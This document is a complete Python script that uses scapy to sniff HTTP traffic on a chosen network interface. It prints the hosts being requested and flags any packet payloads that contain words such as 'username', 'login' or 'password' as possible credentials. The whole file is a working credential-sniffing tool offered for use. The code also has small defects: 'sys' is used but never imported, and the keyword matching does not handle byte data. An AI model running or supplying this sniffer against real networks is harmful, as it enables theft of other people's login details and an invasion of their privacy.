#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse
from colorama import Fore

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', dest='interface', required=True, help="Interface on which to sniff on")
    return parser.parse_args()


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_url(packet):
   return packet[http.HTTPRequest].Host


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        data = packet[scapy.Raw].load
        keywords = ['username', 'user','login', 'pass', 'password']
        for key in keywords:
            if key in data:
                return data


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(Fore.BLUE + "URL Request : " + url)
        information = get_login_info(packet)
        if information:
            print(Fore.GREEN + "\n\n[+] Possible username/password : " + information + "\n\n")

args = parse_args()
try :
    print(Fore.BLUE + "[INFO] Starting sniffer on " + args.interface + "\n\n")
    sniff(args.interface)
except KeyboardInterrupt:
    sys.exit(1)
   

